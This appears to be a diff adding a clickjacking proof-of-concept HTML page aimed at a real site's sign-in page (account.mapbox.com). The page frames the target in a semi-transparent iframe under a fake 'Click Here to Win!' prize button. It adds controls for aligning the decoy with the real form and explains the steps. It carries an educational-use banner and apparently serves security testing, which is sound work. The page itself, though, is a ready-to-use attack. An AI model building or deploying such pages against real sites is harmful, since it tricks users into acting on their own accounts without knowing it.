@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking PoC - Basic</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+        
+        h1 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .target-frame {
+            position: relative;
+            width: 100%;
+            height: 600px;
+            margin: 20px 0;
+            border: 3px solid #dc3545;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0.3; /* Make iframe semi-transparent to see overlay */
+        }
+        
+        .decoy {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none; /* Allow clicks to pass through to iframe */
+            z-index: 1;
+        }
+        
+        .decoy-content {
+            padding: 50px;
+            text-align: center;
+        }
+        
+        .decoy-button {
+            background: #28a745;
+            color: white;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 20px;
+            pointer-events: auto;
+        }
+        
+        .decoy-button:hover {
+            background: #218838;
+        }
+        
+        .controls {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        
+        .control-group {
+            margin: 10px 0;
+        }
+        
+        label {
+            display: inline-block;
+            width: 150px;
+            font-weight: bold;
+        }
+        
+        input[type="range"] {
+            width: 300px;
+        }
+        
+        button {
+            background: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        
+        button:hover {
+            background: #0056b3;
+        }
+        
+        .info {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 Clickjacking Proof of Concept</h1>
+        
+        <div class="warning">
+            <strong>⚠️ WARNING:</strong> This is for educational purposes only. 
+            Test only on authorized systems.
+        </div>
+        
+        <div class="info">
+            <strong>Target URL:</strong> https://account.mapbox.com/auth/signin<br>
+            <strong>Attack Type:</strong> Basic Clickjacking (UI Redressing)
+        </div>
+        
+        <div class="controls">
+            <h3>Controls</h3>
+            <div class="control-group">
+                <label>Frame Opacity:</label>
+                <input type="range" id="opacity" min="0" max="100" value="30" 
+                       oninput="document.getElementById('targetFrame').style.opacity = this.value/100">
+                <span id="opacityValue">30%</span>
+            </div>
+            <div class="control-group">
+                <label>Decoy Position:</label>
+                <button onclick="moveDecoy(0, 0)">Top Left</button>
+                <button onclick="moveDecoy(50, 50)">Center</button>
+                <button onclick="moveDecoy(0, 100)">Bottom</button>
+            </div>
+            <div class="control-group">
+                <button onclick="toggleDecoy()">Toggle Decoy Layer</button>
+                <button onclick="resetPosition()">Reset Position</button>
+            </div>
+        </div>
+        
+        <div class="target-frame">
+            <iframe id="targetFrame" src="https://account.mapbox.com/auth/signin"></iframe>
+            <div class="decoy" id="decoyLayer">
+                <div class="decoy-content">
+                    <h2>🎁 Claim Your Prize!</h2>
+                    <p>Click the button below to win $1000!</p>
+                    <button class="decoy-button">Click Here to Win!</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="info">
+            <strong>How it works:</strong><br>
+            1. The target website is loaded in a transparent iframe<br>
+            2. A decoy interface is overlaid on top<br>
+            3. User thinks they're clicking the decoy, but actually clicking the hidden iframe<br>
+            4. Adjust opacity to align decoy with actual form elements
+        </div>
+    </div>
+    
+    <script>
+        // Update opacity display
+        document.getElementById('opacity').addEventListener('input', function() {
+            document.getElementById('opacityValue').textContent = this.value + '%';
+        });
+        
+        // Move decoy layer
+        function moveDecoy(x, y) {
+            const decoy = document.getElementById('decoyLayer');
+            decoy.style.transform = `translate(${x}%, ${y}%)`;
+        }
+        
+        // Toggle decoy visibility
+        function toggleDecoy() {
+            const decoy = document.getElementById('decoyLayer');
+            decoy.style.display = decoy.style.display === 'none' ? 'block' : 'none';
+        }
+        
+        // Reset position
+        function resetPosition() {
+            moveDecoy(0, 0);
+            document.getElementById('opacity').value = 30;
+            document.getElementById('targetFrame').style.opacity = 0.3;
+            document.getElementById('opacityValue').textContent = '30%';
+        }
+    </script>
+</body>
+</html>
